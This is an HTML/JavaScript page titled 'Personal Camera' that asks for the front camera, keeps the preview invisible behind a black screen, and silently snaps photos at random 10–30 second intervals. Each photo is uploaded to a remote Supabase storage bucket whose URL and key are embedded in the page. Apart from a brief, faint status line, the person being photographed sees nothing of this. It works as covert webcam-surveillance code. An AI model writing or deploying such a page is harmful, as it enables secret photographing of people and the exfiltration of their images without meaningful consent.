
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Personal Camera</title>

    <!-- Supabase -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>
        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            width: 100%;
            height: 100%;
            background: #000;
        }

        body {
            overflow: hidden;
        }

        /* Camera preview remains hidden */
        #camera {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        #canvas {
            display: none;
        }

        #status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);

            color: rgba(255, 255, 255, 0.35);
            font-family: Arial, sans-serif;
            font-size: 12px;

            opacity: 0;
            transition: opacity 0.3s;
        }

        #status.show {
            opacity: 1;
        }
    </style>
</head>

<body>

    <!-- Hidden camera -->
    <video
        id="camera"
        autoplay
        playsinline
        muted
    ></video>

    <!-- Used to capture frames -->
    <canvas id="canvas"></canvas>

    <div id="status"></div>


    <script>

        // ==========================================
        // SUPABASE
        // ==========================================

        const SUPABASE_URL =
            "https://jrrlohtlfnmeotdgsbrk.supabase.co";

        const SUPABASE_KEY =
            "sb_publishable_jRR4HOJqC3yl1Wo5HAqA0A_YLYfknvJ";


        // IMPORTANT:
        // Use a different variable name so it doesn't
        // conflict with window.supabase from the CDN.

        const supabaseClient =
            window.supabase.createClient(
                SUPABASE_URL,
                SUPABASE_KEY
            );


        // ==========================================
        // ELEMENTS
        // ==========================================

        const video =
            document.getElementById("camera");

        const canvas =
            document.getElementById("canvas");

        const status =
            document.getElementById("status");


        let cameraStream = null;


        // ==========================================
        // START CAMERA
        // ==========================================

        async function startCamera() {

            try {

                cameraStream =
                    await navigator.mediaDevices.getUserMedia({

                        video: {
                            facingMode: "user",

                            width: {
                                ideal: 1280
                            },

                            height: {
                                ideal: 720
                            }
                        },

                        audio: false

                    });


                video.srcObject = cameraStream;

                await video.play();


                console.log("Camera started");


                // Wait a little for the camera
                // to fully initialize.

                setTimeout(() => {
                    scheduleNextPhoto();
                }, 3000);


            } catch (error) {

                console.error(
                    "Camera error:",
                    error
                );

                showStatus(
                    "Camera permission required"
                );
            }
        }


        // ==========================================
        // RANDOM PHOTO TIMER
        // ==========================================

        function scheduleNextPhoto() {

            /*
             * Random delay:
             *
             * Minimum: 10 seconds
             * Maximum: 30 seconds
             */

            const minimum = 10000;
            const maximum = 30000;


            const delay =
                Math.floor(
                    Math.random() *
                    (maximum - minimum)
                ) + minimum;


            console.log(
                "Next photo in:",
                Math.round(delay / 1000),
                "seconds"
            );


            setTimeout(async () => {

                await takePhoto();

                scheduleNextPhoto();

            }, delay);
        }


        // ==========================================
        // TAKE PHOTO
        // ==========================================

        async function takePhoto() {

            if (
                !video.videoWidth ||
                !video.videoHeight
            ) {

                console.log(
                    "Camera is not ready yet."
                );

                return;
            }


            // Match canvas to camera resolution

            canvas.width =
                video.videoWidth;

            canvas.height =
                video.videoHeight;


            const context =
                canvas.getContext("2d");


            // Capture current camera frame

            context.drawImage(
                video,
                0,
                0,
                canvas.width,
                canvas.height
            );


            // Convert frame to JPEG

            const blob =
                await new Promise(resolve => {

                    canvas.toBlob(
                        resolve,
                        "image/jpeg",
                        0.85
                    );

                });


            if (!blob) {

                console.error(
                    "Could not create image."
                );

                return;
            }


            // Upload

            await uploadPhoto(blob);
        }


        // ==========================================
        // UPLOAD PHOTO TO SUPABASE
        // ==========================================

        async function uploadPhoto(blob) {

            const timestamp =
                new Date()
                    .toISOString()
                    .replace(/[:.]/g, "-");


            const random =
                Math.random()
                    .toString(36)
                    .substring(2, 8);


            const fileName =
                `photo-${timestamp}-${random}.jpg`;


            try {

                const {
                    data,
                    error
                } = await supabaseClient
                    .storage
                    .from("photos")
                    .upload(
                        fileName,
                        blob,
                        {
                            contentType:
                                "image/jpeg",

                            upsert: false
                        }
                    );


                if (error) {
                    throw error;
                }


                console.log(
                    "Photo uploaded:",
                    data.path
                );


                showStatus(
                    "Photo captured"
                );


            } catch (error) {

                console.error(
                    "Upload failed:",
                    error
                );


                showStatus(
                    "Upload failed"
                );
            }
        }


        // ==========================================
        // STATUS MESSAGE
        // ==========================================

        function showStatus(message) {

            status.textContent =
                message;


            status.classList.add(
                "show"
            );


            setTimeout(() => {

                status.classList.remove(
                    "show"
                );

            }, 1500);
        }


        // ==========================================
        // START
        // ==========================================

        startCamera();

    </script>

</body>
</html>
